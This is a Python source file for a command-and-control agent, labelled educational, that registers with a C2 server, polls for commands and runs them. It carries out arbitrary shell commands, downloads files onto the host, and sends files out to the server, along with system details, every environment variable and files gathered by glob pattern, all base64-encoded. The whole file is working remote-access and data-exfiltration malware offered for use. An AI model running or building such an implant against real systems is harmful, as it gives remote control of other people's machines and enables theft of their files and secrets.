#!/usr/bin/env python3
"""
Enhanced C2 Agent Example
This is a demonstration agent that connects to the C2 server with file upload and data collection capabilities.
For educational/authorized testing purposes only.
"""

import requests
import json
import time
import subprocess
import platform
import socket
import os
import uuid
import base64
import glob
from datetime import datetime
import sys

class C2Agent:
    def __init__(self, server_url="http://localhost:3002"):
        self.server_url = server_url
        self.agent_id = str(uuid.uuid4())
        self.session = requests.Session()
        
    def get_system_info(self):
        """Get basic system information"""
        return {
            'hostname': socket.gethostname(),
            'username': os.getenv('USERNAME') or os.getenv('USER'),
            'os_info': platform.platform(),
            'ip_address': socket.gethostbyname(socket.gethostname())
        }
    
    def register(self):
        """Register with the C2 server"""
        try:
            system_info = self.get_system_info()
            data = {
                'agent_id': self.agent_id,
                'hostname': system_info['hostname'],
                'username': system_info['username'],
                'os_info': system_info['os_info'],
                'ip_address': system_info['ip_address']
            }
            
            response = self.session.post(f"{self.server_url}/api/c2/register", json=data)
            if response.status_code == 200:
                print(f"[+] Successfully registered as agent: {self.agent_id}")
                return True
            else:
                print(f"[-] Registration failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] Registration error: {e}")
            return False
    
    def execute_shell_command(self, command):
        """Execute a shell command"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'return_code': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'output': '',
                'error': 'Command timed out',
                'return_code': -1
            }
        except Exception as e:
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'return_code': -1
            }
    
    def take_screenshot(self):
        """Take a screenshot (placeholder)"""
        try:
            # This is a placeholder - in a real implementation you'd use PIL or similar
            return {
                'success': True,
                'output': 'Screenshot functionality not implemented in this demo',
                'error': '',
                'return_code': 0
            }
        except Exception as e:
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'return_code': -1
            }
    
    def download_file(self, url, local_path):
        """Download a file"""
        try:
            response = self.session.get(url, stream=True)
            if response.status_code == 200:
                with open(local_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                return {
                    'success': True,
                    'output': f'File downloaded to {local_path}',
                    'error': '',
                    'return_code': 0,
                    'file_path': local_path,
                    'file_size': os.path.getsize(local_path)
                }
            else:
                return {
                    'success': False,
                    'output': '',
                    'error': f'Download failed with status {response.status_code}',
                    'return_code': response.status_code
                }
        except Exception as e:
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'return_code': -1
            }
    
    def upload_file(self, local_path, command_id=None):
        """Upload a file to the C2 server"""
        try:
            if not os.path.exists(local_path):
                return {
                    'success': False,
                    'output': '',
                    'error': f'File not found: {local_path}',
                    'return_code': -1
                }
            
            # Read and encode file
            with open(local_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode('utf-8')
            
            data = {
                'filename': os.path.basename(local_path),
                'file_data': file_data,
                'file_type': 'application/octet-stream',
                'command_id': command_id
            }
            
            response = self.session.post(f"{self.server_url}/api/c2/upload/{self.agent_id}", json=data)
            if response.status_code == 200:
                result = response.json()
                return {
                    'success': True,
                    'output': f'File uploaded: {result.get("file_path", "unknown")}',
                    'error': '',
                    'return_code': 0,
                    'file_path': result.get('file_path'),
                    'file_size': result.get('file_size')
                }
            else:
                return {
                    'success': False,
                    'output': '',
                    'error': f'Upload failed: {response.status_code}',
                    'return_code': response.status_code
                }
        except Exception as e:
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'return_code': -1
            }
    
    def collect_system_data(self):
        """Collect system information and data"""
        try:
            data = {
                'system_info': {
                    'platform': platform.platform(),
                    'machine': platform.machine(),
                    'processor': platform.processor(),
                    'python_version': platform.python_version(),
                    'hostname': socket.gethostname(),
                    'username': os.getenv('USERNAME') or os.getenv('USER'),
                    'home_dir': os.path.expanduser('~'),
                    'current_dir': os.getcwd()
                },
                'network_info': {
                    'hostname': socket.gethostname(),
                    'ip_address': socket.gethostbyname(socket.gethostname()),
                    'fqdn': socket.getfqdn()
                },
                'environment': dict(os.environ),
                'timestamp': datetime.now().isoformat()
            }
            
            return {
                'success': True,
                'output': json.dumps(data, indent=2),
                'error': '',
                'return_code': 0,
                'data': data
            }
        except Exception as e:
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'return_code': -1
            }
    
    def collect_files_by_pattern(self, pattern, max_files=10):
        """Collect files matching a pattern"""
        try:
            files = glob.glob(pattern, recursive=True)
            collected_files = []
            
            for file_path in files[:max_files]:
                try:
                    if os.path.isfile(file_path) and os.path.getsize(file_path) < 1024 * 1024:  # 1MB limit
                        with open(file_path, 'rb') as f:
                            file_data = base64.b64encode(f.read()).decode('utf-8')
                        
                        collected_files.append({
                            'filename': os.path.basename(file_path),
                            'path': file_path,
                            'size': os.path.getsize(file_path),
                            'data': file_data
                        })
                except Exception as e:
                    print(f"[-] Error reading file {file_path}: {e}")
            
            return {
                'success': True,
                'output': f'Collected {len(collected_files)} files',
                'error': '',
                'return_code': 0,
                'files': collected_files
            }
        except Exception as e:
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'return_code': -1
            }
    
    def submit_data_collection(self, data_type, data_content, metadata=None):
        """Submit collected data to the C2 server"""
        try:
            data = {
                'data_type': data_type,
                'data_content': data_content,
                'metadata': metadata or {}
            }
            
            response = self.session.post(f"{self.server_url}/api/c2/data/{self.agent_id}", json=data)
            if response.status_code == 200:
                print(f"[+] Data collection submitted: {data_type}")
                return True
            else:
                print(f"[-] Failed to submit data collection: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] Error submitting data collection: {e}")
            return False
    
    def bulk_upload(self, files=None, data_collection=None):
        """Upload multiple files and data in one request"""
        try:
            payload = {}
            
            if files:
                payload['files'] = files
            
            if data_collection:
                payload['data_collection'] = data_collection
            
            response = self.session.post(f"{self.server_url}/api/c2/bulk-upload/{self.agent_id}", json=payload)
            if response.status_code == 200:
                result = response.json()
                print(f"[+] Bulk upload completed: {len(result.get('results', []))} items")
                return result
            else:
                print(f"[-] Bulk upload failed: {response.status_code}")
                return None
        except Exception as e:
            print(f"[-] Error in bulk upload: {e}")
            return None
    
    def execute_command(self, command):
        """Execute a command based on its type"""
        command_type = command.get('command_type', 'shell')
        command_data = command.get('command_data', '')
        
        if command_type == 'shell':
            return self.execute_shell_command(command_data)
        elif command_type == 'screenshot':
            return self.take_screenshot()
        elif command_type == 'download':
            # Parse download command: "url|local_path"
            parts = command_data.split('|')
            if len(parts) == 2:
                return self.download_file(parts[0].strip(), parts[1].strip())
            else:
                return {
                    'success': False,
                    'output': '',
                    'error': 'Invalid download command format. Use: url|local_path',
                    'return_code': -1
                }
        elif command_type == 'upload':
            # Upload file command: "local_path"
            return self.upload_file(command_data.strip(), command.get('id'))
        elif command_type == 'collect_data':
            # Collect system data
            return self.collect_system_data()
        elif command_type == 'collect_files':
            # Collect files by pattern: "pattern|max_files"
            parts = command_data.split('|')
            pattern = parts[0].strip()
            max_files = int(parts[1].strip()) if len(parts) > 1 else 10
            return self.collect_files_by_pattern(pattern, max_files)
        elif command_type == 'kill_process':
            # Kill the current process
            return {
                'success': True,
                'output': 'Process termination initiated',
                'error': '',
                'return_code': 0
            }
        elif command_type == 'kill_agent':
            # Mark agent as compromised and terminate
            return {
                'success': True,
                'output': 'Agent termination initiated',
                'error': '',
                'return_code': 0
            }
        else:
            return {
                'success': False,
                'output': '',
                'error': f'Unknown command type: {command_type}',
                'return_code': -1
            }
    
    def submit_result(self, command_id, result):
        """Submit command result to the C2 server"""
        try:
            data = {
                'command_id': command_id,
                'agent_id': self.agent_id,
                'result_data': result.get('output', ''),
                'file_path': result.get('file_path', ''),
                'file_size': result.get('file_size', 0),
                'success': result.get('success', False),
                'error_message': result.get('error', '')
            }
            
            response = self.session.post(f"{self.server_url}/api/c2/result", json=data)
            if response.status_code == 200:
                print(f"[+] Result submitted for command {command_id}")
                return True
            else:
                print(f"[-] Failed to submit result: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] Error submitting result: {e}")
            return False
    
    def get_commands(self):
        """Get pending commands from the C2 server"""
        try:
            response = self.session.get(f"{self.server_url}/api/c2/commands/{self.agent_id}")
            if response.status_code == 200:
                data = response.json()
                return data.get('commands', [])
            else:
                print(f"[-] Failed to get commands: {response.status_code}")
                return []
        except Exception as e:
            print(f"[-] Error getting commands: {e}")
            return []
    
    def run(self):
        """Main agent loop"""
        print(f"[*] Starting C2 agent: {self.agent_id}")
        
        # Register with the server
        if not self.register():
            print("[-] Failed to register. Exiting.")
            return
        
        print("[*] Agent is running. Press Ctrl+C to stop.")
        
        try:
            while True:
                # Get pending commands
                commands = self.get_commands()
                
                for command in commands:
                    print(f"[*] Executing command {command['id']}: {command['command_type']}")
                    
                    # Execute the command
                    result = self.execute_command(command)
                    
                    # Handle special data collection commands
                    if command['command_type'] == 'collect_data' and result.get('success'):
                        # Submit collected data separately
                        self.submit_data_collection('system_info', result.get('data', {}))
                    
                    elif command['command_type'] == 'collect_files' and result.get('success'):
                        # Upload collected files
                        files = result.get('files', [])
                        if files:
                            file_data = []
                            for file_info in files:
                                file_data.append({
                                    'filename': file_info['filename'],
                                    'data': file_info['data']
                                })
                            self.bulk_upload(files=file_data)
                    
                    # Handle kill commands
                    elif command['command_type'] in ['kill_process', 'kill_agent']:
                        # Submit the result first
                        self.submit_result(command['id'], result)
                        print(f"[*] {result.get('output', 'Termination initiated')}")
                        time.sleep(1)  # Give time for result submission
                        sys.exit(0)  # Terminate the agent
                    
                    # Submit the result
                    self.submit_result(command['id'], result)
                
                # Sleep before next check
                time.sleep(5)
                
        except KeyboardInterrupt:
            print("\n[*] Agent stopped by user")
        except Exception as e:
            print(f"[-] Agent error: {e}")

if __name__ == "__main__":
    # You can change the server URL here
    SERVER_URL = "http://localhost:3002"  # Change this to your server URL
    
    agent = C2Agent(SERVER_URL)
    agent.run() 